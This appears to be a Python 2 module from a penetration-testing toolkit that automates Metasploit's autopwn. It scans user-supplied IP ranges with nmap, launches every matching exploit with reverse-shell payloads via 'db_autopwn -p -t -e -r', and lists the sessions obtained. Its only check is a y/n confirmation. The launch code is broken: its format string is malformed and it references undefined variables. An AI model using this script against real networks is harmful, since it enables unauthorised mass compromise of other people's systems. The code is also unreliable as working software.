#!/usr/bin/env python
#
#
# Metasploit Autopwn functionality
#
#
from src.core import setcore
import pexpect


# this will load the database
def prep(database, ranges):
    print "\n"
    setcore.PrintStatus("Prepping the answer file based on what was specified.")
    # prep the file to be written
    filewrite=file("src/program_junk/autopwn.answer", "w")
    setcore.PrintStatus("Using the " + database + "sql driver for autopwn")
    filewrite.write("db_driver " + database + "\r\n")
    setcore.PrintStatus("Autopwn will attack the following systems: " + ranges)
    filewrite.write("db_nmap " + ranges + "\r\n")
    filewrite.write("db_autopwn -p -t -e -r\r\n")
    filewrite.write("jobs -K\r\n")
    filewrite.write("sessions -l\r\n")
    filewrite.close()
    setcore.PrintStatus("Answer file has been created and prepped for delivery into Metasploit.\n")


def launch():
    """ here we cant use the path for metasploit via setcore.meta_path. If the full path is specified it breaks
            database support for msfconsole for some reason. reported this as a bug, may be fixed soon... until then
            if path variables aren't set for msfconsole this will break, even if its specified in set_config """

    # launch the attack
    setcore.PrintStatus("Launching Metasploit and attacking the systems specified. This may take a moment..")
    # try/catch block
    try:
        child = pexpect.spawn("%msfconsole -r %s/autopwn.answer\r\n\r\n" % (meta_path,setdir))
        child.interact()

    # handle exceptions and log them
    except Exception, error: setcore.log(error)


def do_autopwn():
    print 'Doing do_autopwn'
    # pull the metasploit database
    database = setcore.meta_database()
    range = raw_input(setcore.setprompt(["19","20"], "Enter the IP ranges to attack (nmap syntax only)"))

    # prep the answer file
    prep(database, range)
    confirm_attack = raw_input(setcore.setprompt(["19","20"], "You are about to attack systems are you sure [y/n]"))

    # if we are sure, then lets do it
    if confirm_attack == "yes" or confirm_attack == "y":
        launch()
